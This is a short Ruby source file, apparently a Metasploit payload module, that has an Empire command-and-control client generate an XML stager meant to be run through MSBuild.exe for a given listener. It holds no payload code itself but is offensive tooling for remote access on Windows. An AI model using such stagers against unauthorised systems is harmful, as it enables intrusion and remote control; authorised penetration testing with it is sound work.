##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
                     'Description'=> 'Creates a XML script for Empire to be used with MSBuild.exe'
    ))
  end

  def stager_generator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/launcher_xml')
    return @stagerCode
  end
end
